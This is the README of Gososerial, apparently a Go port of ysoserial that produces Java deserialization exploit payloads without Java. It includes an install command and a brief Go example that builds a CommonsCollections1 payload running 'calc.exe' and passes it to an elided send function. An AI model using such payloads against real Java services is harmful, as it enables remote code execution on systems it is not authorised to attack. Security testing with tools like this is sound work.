# Gososerial

## 介绍

- ysoserial是java反序列化安全方面著名的工具
  
- 无需java环境，无需下载ysoserial.jar文件
  
- 输入命令直接获得payload，方便编写安全工具 

## Introduce

- Ysoserial is a well-known tool for Java deserialization security

- No Java environment and no need to download ysoserial.jar file

- Enter the command to directly obtain the payload, which is convenient for writing security tools

## Quick Start

```shell
go get github.com/EmYiQing/Gososerial
```

```go
package main

import (
	"github.com/EmYiQing/Gososerial"
	"net/http"
)

func main()  {
	payload := Gososerial.GetCC1("calc.exe")
	....
	sendPayload(payload)
	......
}
```

## Example

![](https://github.com/EmYiQing/Gososerial/blob/master/img/1.png)